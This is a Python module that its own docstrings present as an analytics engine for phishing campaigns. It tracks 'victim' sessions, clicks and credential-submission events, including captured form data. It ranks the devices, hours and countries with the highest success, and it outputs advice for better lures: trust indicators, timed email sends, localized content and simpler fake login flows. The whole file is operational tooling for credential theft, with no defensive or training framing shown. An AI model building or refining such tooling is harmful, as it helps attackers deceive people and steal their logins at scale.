"""
Behavioral Analyzer - Advanced User Behavior Analysis
======================================================

Analyzes victim behavior patterns to optimize campaigns:
- Click-through rates
- Time-on-page analysis
- Form interaction patterns
- Device and browser patterns
- Geographic distribution
- Temporal patterns
"""

import json
import statistics
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from collections import defaultdict, Counter
import pandas as pd
import numpy as np


@dataclass
class UserSession:
    """User session data"""
    session_id: str
    user_id: str
    timestamp: datetime
    device_type: str
    browser: str
    os: str
    ip_address: str
    location: Dict[str, str]
    user_agent: str
    screen_resolution: str
    language: str
    timezone: str


@dataclass
class InteractionEvent:
    """User interaction event"""
    session_id: str
    event_type: str  # click, scroll, type, submit, etc.
    element_id: str
    timestamp: datetime
    coordinates: Tuple[int, int]
    scroll_depth: float
    time_on_page: float
    referrer: str


@dataclass
class ConversionEvent:
    """Conversion/credential submission event"""
    session_id: str
    timestamp: datetime
    form_data: Dict[str, Any]
    submission_time: float
    field_interactions: List[str]
    errors_encountered: List[str]
    success: bool


@dataclass
class BehavioralMetrics:
    """Behavioral analysis metrics"""
    total_sessions: int
    unique_users: int
    conversion_rate: float
    avg_session_duration: float
    avg_time_to_conversion: float
    bounce_rate: float
    top_devices: List[Tuple[str, float]]
    top_browsers: List[Tuple[str, float]]
    top_locations: List[Tuple[str, float]]
    peak_hours: List[Tuple[int, float]]
    conversion_funnel: Dict[str, float]
    behavioral_segments: Dict[str, Any]


class BehavioralAnalyzer:
    """
    Advanced behavioral analysis engine for phishing campaigns.
    Extracts actionable insights from user behavior data.
    """
    
    def __init__(self):
        self.sessions = []
        self.interactions = []
        self.conversions = []
        
        # Behavioral patterns
        self.device_patterns = defaultdict(list)
        self.temporal_patterns = defaultdict(list)
        self.geographic_patterns = defaultdict(list)
        
        # Analysis thresholds
        self.conversion_threshold = 0.05  # 5% baseline
        self.bounce_threshold = 0.7      # 70% bounce rate
        self.session_timeout = 1800       # 30 minutes
    
    def add_session(self, session: UserSession) -> None:
        """Add user session data"""
        self.sessions.append(session)
    
    def add_interaction(self, interaction: InteractionEvent) -> None:
        """Add interaction event"""
        self.interactions.append(interaction)
    
    def add_conversion(self, conversion: ConversionEvent) -> None:
        """Add conversion event"""
        self.conversions.append(conversion)
    
    def analyze_campaign_performance(self, campaign_id: str = None) -> BehavioralMetrics:
        """Comprehensive campaign performance analysis"""
        if not self.sessions:
            return BehavioralMetrics(0, 0, 0.0, 0.0, 0.0, 1.0, [], [], [], [], {}, {})
        
        # Basic metrics
        total_sessions = len(self.sessions)
        unique_users = len(set(s.user_id for s in self.sessions))
        
        # Conversion analysis
        conversion_sessions = set(c.session_id for c in self.conversions if c.success)
        conversion_rate = len(conversion_sessions) / total_sessions
        
        # Session duration analysis
        session_durations = self._calculate_session_durations()
        avg_session_duration = statistics.mean(session_durations) if session_durations else 0.0
        
        # Time to conversion
        conversion_times = [c.submission_time for c in self.conversions if c.success]
        avg_time_to_conversion = statistics.mean(conversion_times) if conversion_times else 0.0
        
        # Bounce rate (sessions < 10 seconds)
        short_sessions = [d for d in session_durations if d < 10]
        bounce_rate = len(short_sessions) / total_sessions
        
        # Device analysis
        device_stats = self._analyze_device_patterns()
        top_devices = sorted(device_stats.items(), key=lambda x: x[1], reverse=True)[:5]
        
        # Browser analysis
        browser_stats = self._analyze_browser_patterns()
        top_browsers = sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:5]
        
        # Geographic analysis
        location_stats = self._analyze_geographic_patterns()
        top_locations = sorted(location_stats.items(), key=lambda x: x[1], reverse=True)[:5]
        
        # Temporal analysis
        hourly_stats = self._analyze_temporal_patterns()
        peak_hours = sorted(hourly_stats.items(), key=lambda x: x[1], reverse=True)[:5]
        
        # Conversion funnel
        conversion_funnel = self._analyze_conversion_funnel()
        
        # Behavioral segmentation
        behavioral_segments = self._perform_behavioral_segmentation()
        
        return BehavioralMetrics(
            total_sessions=total_sessions,
            unique_users=unique_users,
            conversion_rate=conversion_rate,
            avg_session_duration=avg_session_duration,
            avg_time_to_conversion=avg_time_to_conversion,
            bounce_rate=bounce_rate,
            top_devices=top_devices,
            top_browsers=top_browsers,
            top_locations=top_locations,
            peak_hours=peak_hours,
            conversion_funnel=conversion_funnel,
            behavioral_segments=behavioral_segments
        )
    
    def _calculate_session_durations(self) -> List[float]:
        """Calculate session durations"""
        durations = []
        
        for session in self.sessions:
            # Get all interactions for this session
            session_interactions = [i for i in self.interactions if i.session_id == session.session_id]
            
            if session_interactions:
                first_interaction = min(i.timestamp for i in session_interactions)
                last_interaction = max(i.timestamp for i in session_interactions)
                duration = (last_interaction - first_interaction).total_seconds()
                durations.append(duration)
            else:
                # No interactions, assume 0 duration
                durations.append(0.0)
        
        return durations
    
    def _analyze_device_patterns(self) -> Dict[str, float]:
        """Analyze device usage patterns"""
        device_counts = Counter(s.device_type for s in self.sessions)
        total = sum(device_counts.values())
        
        return {device: count/total for device, count in device_counts.items()}
    
    def _analyze_browser_patterns(self) -> Dict[str, float]:
        """Analyze browser usage patterns"""
        browser_counts = Counter(s.browser for s in self.sessions)
        total = sum(browser_counts.values())
        
        return {browser: count/total for browser, count in browser_counts.items()}
    
    def _analyze_geographic_patterns(self) -> Dict[str, float]:
        """Analyze geographic distribution"""
        location_counts = Counter(s.location.get('country', 'Unknown') for s in self.sessions)
        total = sum(location_counts.values())
        
        return {location: count/total for location, count in location_counts.items()}
    
    def _analyze_temporal_patterns(self) -> Dict[int, float]:
        """Analyze hourly activity patterns"""
        hourly_counts = Counter(s.timestamp.hour for s in self.sessions)
        total = sum(hourly_counts.values())
        
        return {hour: count/total for hour, count in hourly_counts.items()}
    
    def _analyze_conversion_funnel(self) -> Dict[str, float]:
        """Analyze conversion funnel stages"""
        total_sessions = len(self.sessions)
        
        # Stage 1: Page view (all sessions)
        page_views = total_sessions
        
        # Stage 2: Form interaction
        form_interactions = len(set(i.session_id for i in self.interactions 
                                   if i.event_type in ['click', 'type', 'focus']))
        
        # Stage 3: Form submission attempt
        submission_attempts = len(set(c.session_id for c in self.conversions))
        
        # Stage 4: Successful conversion
        successful_conversions = len(set(c.session_id for c in self.conversions if c.success))
        
        return {
            'page_views': page_views / total_sessions,
            'form_interactions': form_interactions / total_sessions,
            'submission_attempts': submission_attempts / total_sessions,
            'successful_conversions': successful_conversions / total_sessions
        }
    
    def _perform_behavioral_segmentation(self) -> Dict[str, Any]:
        """Perform behavioral segmentation analysis"""
        segments = {}
        
        # Segment by device type
        device_segments = {}
        for device in set(s.device_type for s in self.sessions):
            device_sessions = [s for s in self.sessions if s.device_type == device]
            device_conversions = len(set(c.session_id for c in self.conversions 
                                       if c.success and any(s.session_id == c.session_id 
                                                          for s in device_sessions)))
            device_segments[device] = {
                'sessions': len(device_sessions),
                'conversions': device_conversions,
                'conversion_rate': device_conversions / len(device_sessions) if device_sessions else 0
            }
        
        segments['by_device'] = device_segments
        
        # Segment by time of day
        time_segments = {'morning': [], 'afternoon': [], 'evening': [], 'night': []}
        for session in self.sessions:
            hour = session.timestamp.hour
            if 6 <= hour < 12:
                time_segments['morning'].append(session)
            elif 12 <= hour < 18:
                time_segments['afternoon'].append(session)
            elif 18 <= hour < 24:
                time_segments['evening'].append(session)
            else:
                time_segments['night'].append(session)
        
        time_analysis = {}
        for time_period, sessions in time_segments.items():
            conversions = len(set(c.session_id for c in self.conversions 
                                if c.success and any(s.session_id == c.session_id 
                                                   for s in sessions)))
            time_analysis[time_period] = {
                'sessions': len(sessions),
                'conversions': conversions,
                'conversion_rate': conversions / len(sessions) if sessions else 0
            }
        
        segments['by_time'] = time_analysis
        
        # Segment by engagement level
        engagement_segments = {'high': [], 'medium': [], 'low': []}
        for session in self.sessions:
            session_interactions = [i for i in self.interactions if i.session_id == session.session_id]
            interaction_count = len(session_interactions)
            
            if interaction_count > 10:
                engagement_segments['high'].append(session)
            elif interaction_count > 3:
                engagement_segments['medium'].append(session)
            else:
                engagement_segments['low'].append(session)
        
        engagement_analysis = {}
        for level, sessions in engagement_segments.items():
            conversions = len(set(c.session_id for c in self.conversions 
                                if c.success and any(s.session_id == c.session_id 
                                                   for s in sessions)))
            engagement_analysis[level] = {
                'sessions': len(sessions),
                'conversions': conversions,
                'conversion_rate': conversions / len(sessions) if sessions else 0
            }
        
        segments['by_engagement'] = engagement_analysis
        
        return segments
    
    def identify_high_value_segments(self) -> List[Dict[str, Any]]:
        """Identify high-value user segments"""
        metrics = self.analyze_campaign_performance()
        segments = metrics.behavioral_segments
        
        high_value_segments = []
        
        # Analyze device segments
        device_segments = segments.get('by_device', {})
        for device, data in device_segments.items():
            if data['conversion_rate'] > metrics.conversion_rate * 1.5:
                high_value_segments.append({
                    'segment_type': 'device',
                    'segment_value': device,
                    'conversion_rate': data['conversion_rate'],
                    'lift': data['conversion_rate'] / metrics.conversion_rate,
                    'sessions': data['sessions']
                })
        
        # Analyze time segments
        time_segments = segments.get('by_time', {})
        for time_period, data in time_segments.items():
            if data['conversion_rate'] > metrics.conversion_rate * 1.5:
                high_value_segments.append({
                    'segment_type': 'time',
                    'segment_value': time_period,
                    'conversion_rate': data['conversion_rate'],
                    'lift': data['conversion_rate'] / metrics.conversion_rate,
                    'sessions': data['sessions']
                })
        
        # Analyze engagement segments
        engagement_segments = segments.get('by_engagement', {})
        for level, data in engagement_segments.items():
            if data['conversion_rate'] > metrics.conversion_rate * 1.5:
                high_value_segments.append({
                    'segment_type': 'engagement',
                    'segment_value': level,
                    'conversion_rate': data['conversion_rate'],
                    'lift': data['conversion_rate'] / metrics.conversion_rate,
                    'sessions': data['sessions']
                })
        
        # Sort by lift
        high_value_segments.sort(key=lambda x: x['lift'], reverse=True)
        
        return high_value_segments
    
    def generate_optimization_recommendations(self) -> List[Dict[str, Any]]:
        """Generate campaign optimization recommendations"""
        metrics = self.analyze_campaign_performance()
        recommendations = []
        
        # Conversion rate recommendations
        if metrics.conversion_rate < self.conversion_threshold:
            recommendations.append({
                'type': 'conversion_rate',
                'priority': 'high',
                'current_rate': metrics.conversion_rate,
                'target_rate': self.conversion_threshold,
                'recommendations': [
                    'Optimize form design for better usability',
                    'Improve page load speed',
                    'Test different call-to-action placements',
                    'Simplify the authentication flow'
                ]
            })
        
        # Bounce rate recommendations
        if metrics.bounce_rate > self.bounce_threshold:
            recommendations.append({
                'type': 'bounce_rate',
                'priority': 'high',
                'current_rate': metrics.bounce_rate,
                'target_rate': self.bounce_threshold,
                'recommendations': [
                    'Improve page load performance',
                    'Enhance mobile experience',
                    'Reduce form complexity',
                    'Add trust indicators'
                ]
            })
        
        # Device optimization
        if metrics.top_devices:
            worst_device = min(metrics.top_devices, key=lambda x: x[1])
            if worst_device[1] < 0.1:  # Less than 10% for any device
                recommendations.append({
                    'type': 'device_optimization',
                    'priority': 'medium',
                    'device': worst_device[0],
                    'usage_rate': worst_device[1],
                    'recommendations': [
                        f'Improve {worst_device[0]} compatibility',
                        f'Test on {worst_device[0]} devices',
                        f'Optimize for {worst_device[0]} screen sizes'
                    ]
                })
        
        # Temporal optimization
        if metrics.peak_hours:
            best_hour = max(metrics.peak_hours, key=lambda x: x[1])
            recommendations.append({
                'type': 'temporal_optimization',
                'priority': 'medium',
                'peak_hour': best_hour[0],
                'peak_rate': best_hour[1],
                'recommendations': [
                    f'Schedule email sends around {best_hour[0]}:00',
                    f'Increase server capacity during peak hours',
                    f'Run A/B tests during peak activity'
                ]
            })
        
        # Geographic targeting
        if metrics.top_locations:
            best_location = max(metrics.top_locations, key=lambda x: x[1])
            recommendations.append({
                'type': 'geographic_optimization',
                'priority': 'low',
                'top_location': best_location[0],
                'conversion_rate': best_location[1],
                'recommendations': [
                    f'Localize content for {best_location[0]}',
                    f'Target {best_location[0]} users specifically',
                    f'Use {best_location[0]} cultural references'
                ]
            })
        
        return recommendations
    
    def export_analysis_report(self, output_file: str = None) -> Dict[str, Any]:
        """Export comprehensive analysis report"""
        metrics = self.analyze_campaign_performance()
        high_value_segments = self.identify_high_value_segments()
        recommendations = self.generate_optimization_recommendations()
        
        report = {
            'analysis_timestamp': datetime.now().isoformat(),
            'campaign_metrics': asdict(metrics),
            'high_value_segments': high_value_segments,
            'optimization_recommendations': recommendations,
            'data_summary': {
                'total_sessions': len(self.sessions),
                'total_interactions': len(self.interactions),
                'total_conversions': len(self.conversions),
                'date_range': {
                    'start': min(s.timestamp for s in self.sessions).isoformat() if self.sessions else None,
                    'end': max(s.timestamp for s in self.sessions).isoformat() if self.sessions else None
                }
            }
        }
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
        
        return report
    
    def load_data_from_json(self, sessions_file: str, interactions_file: str, 
                          conversions_file: str) -> None:
        """Load data from JSON files"""
        # Load sessions
        with open(sessions_file, 'r') as f:
            sessions_data = json.load(f)
            for session_data in sessions_data:
                session_data['timestamp'] = datetime.fromisoformat(session_data['timestamp'])
                self.sessions.append(UserSession(**session_data))
        
        # Load interactions
        with open(interactions_file, 'r') as f:
            interactions_data = json.load(f)
            for interaction_data in interactions_data:
                interaction_data['timestamp'] = datetime.fromisoformat(interaction_data['timestamp'])
                self.interactions.append(InteractionEvent(**interaction_data))
        
        # Load conversions
        with open(conversions_file, 'r') as f:
            conversions_data = json.load(f)
            for conversion_data in conversions_data:
                conversion_data['timestamp'] = datetime.fromisoformat(conversion_data['timestamp'])
                self.conversions.append(ConversionEvent(**conversion_data))
